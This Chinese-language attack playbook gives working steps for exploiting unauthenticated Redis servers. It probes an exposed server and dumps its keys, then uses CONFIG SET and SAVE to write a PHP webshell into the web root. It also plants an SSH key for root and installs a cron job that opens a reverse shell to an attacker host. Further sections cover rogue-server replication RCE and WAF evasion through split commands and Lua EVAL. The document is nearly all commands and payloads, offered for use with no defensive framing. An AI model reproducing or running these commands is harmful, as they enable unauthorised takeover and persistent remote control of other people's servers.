# Redis未授权访问 (sqli-redis)

## 执行步骤

### 1. 探测Redis

```bash
redis-cli -h target.com ping
redis-cli -h target.com info
```

### 2. 未授权访问

```bash
redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key
```

### 3. 写入Webshell

```bash
redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```

### 4. 写入SSH公钥

```bash
redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE
```

### 5. 写入Cron任务

```bash
redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE
```

### 6. 主从复制RCE

```bash
使用redis-rogue-server工具:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
```

## WAF绕过

### Redis命令混淆绕过

```bash
redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\$_GET['cmd']); ?>"
> SAVE
```

### Redis Lua脚本执行绕过

```bash
redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```
